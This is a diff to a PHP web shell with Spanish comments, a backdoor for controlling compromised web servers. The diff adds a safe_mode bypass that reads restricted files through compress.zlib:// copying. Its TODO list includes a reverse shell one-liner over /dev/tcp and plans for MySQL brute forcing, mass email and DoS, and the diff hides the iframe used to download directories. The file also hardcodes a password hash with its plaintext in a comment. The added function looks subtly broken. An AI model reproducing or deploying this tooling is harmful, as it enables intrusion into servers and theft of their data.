@@ -42,7 +42,7 @@
   
   Changelog:
   1.4
-    [!] El usuario por defecto es byseth
+    [!] El usuario por defecto es "by seth"
     [+] El css se muestra como un archivo separado para que quede en cache y cargue mas rapido
     [!] Arreglados un par de bugs al leer archivos
     [!] Arreglado un bug en el formulario para hacer chmod
@@ -51,6 +51,7 @@
     [-] w=creditos no está mas
     [!] Cambió el icono para ejecutar comandos dentro de una carpeta
     [+] Funcion para empaquetar y descargar directorios
+    [+] Bypass safe mode http://securityreason.com/achievement_securityalert/37
 
   1.3.1
     [!] Modificado un bug que hacia que no se guarde la cookie con el estado del div lateral si no se ve el div de abajo
@@ -68,18 +69,18 @@
     [+] Agregar brute force de mysql
     [+] Agregar navegador de sql
     [+] Enviar muchos emails de un saque
-    [+] DDoS ?
+    [+] DoS ?
     [+] Poner todas las imágenes en un solo archivo y mostrarlas con css para ahorrar peticiones
     [+] Usar ajax
     [+] Agregar comandos de la WSO, r57 y las variaciones de c99
     [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
     [+] Agregar un reverse dns como el de US dentro de la shell
     [+] Comprimir directorios con ZipArchive
-    [+] Agregar bypass para safe_mode con http://securityreason.com/achievement_securityalert/37 y http://securityreason.com/achievement_securityalert/44
+    [+] Reverse shell: exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 */
 
 //Usuario (Dejalo vacio para que no pida clave):
-$nombre_usuario = 'byseth';
+$nombre_usuario = 'by seth';
 //hash sha1 de la clave
 $clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"
 
@@ -90,7 +91,7 @@ $rfiurl = false;
 error_reporting(0); //final
 //error_reporting(E_ALL); //desarrollo
 
-/**/ 
+/**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/
 
 // http://securityreason.com/achievement_securityalert/42
 if(strtolower(ini_get('safe_mode'))=='on'){
@@ -1107,12 +1108,13 @@ psybnc.conf
     case 'comprimir':
         $ruta = realpath($_GET['ruta']);
         if ( shell('tar czf ' . escapeshellarg('/tmp/'.basename($ruta).'.tar.gz') . ' '.escapeshellarg($ruta)) ){
-            //echo '<script>document.location=\''.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'\';</script>';
-            echo '<iframe src="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">';
+            echo '<iframe style="display: none;" src="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">';
             echo '<a href="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">Descargar y borrar</a>';
-            echo '</iframe>';    
+            echo '</iframe>';
+        }else{
+            echo '<div class="n center">Error! Capaz no se puede ejecutar tar o escribir en /tmp. Probá a mano.</div><br />';
         }
-        
+        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($ruta),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
     break;
 
     /* Enviar emails */
@@ -1578,7 +1580,9 @@ function leer_archivo($ruta){
     }elseif(function_exists('file_get_contents') and (($salida = file_get_contents($ruta))!==false)){
         
     }elseif((is_readable($ruta) and ($salida = shell('cat "'.addslashes($ruta).'"',false)))!==false){
-        
+    
+    }elseif(($salida = leer_archivo_copy_safe_mode_bypass($ruta))!==false){
+    
     }else{ $salida = FALSE; }
     
     if ($permisosviejos !== FALSE){
@@ -1611,6 +1615,21 @@ function leer_archivo_file($ruta){
     }else{
         implode('', $salida);
         return $salida;
+    }
+}
+function leer_archivo_copy_safe_mode_bypass($ruta){
+    //http://securityreason.com/achievement_securityalert/37
+    static $recursivo;
+    if( $recursivo == true ) {
+        return false;
+    }else{
+        $recursivo = true;
+        if ($temporal = tempnam(directorio_escribible())) {
+            copy('compress.zlib://'.$ruta, $temporal);
+            $archivo = leerarchivo($temporal);
+            unlink($temporal);
+        }
+        $recursivo = false;
     }
 }
 
@@ -1728,7 +1747,7 @@ function mostrar_informacion(){
     } 
     
     $salida = '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
-    <b>'.htmlentities(decode_size(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
+    <b>Libre: '.htmlentities(decode_size(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
     <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Safe_mode:</b> '.$safemode.'<br><br>
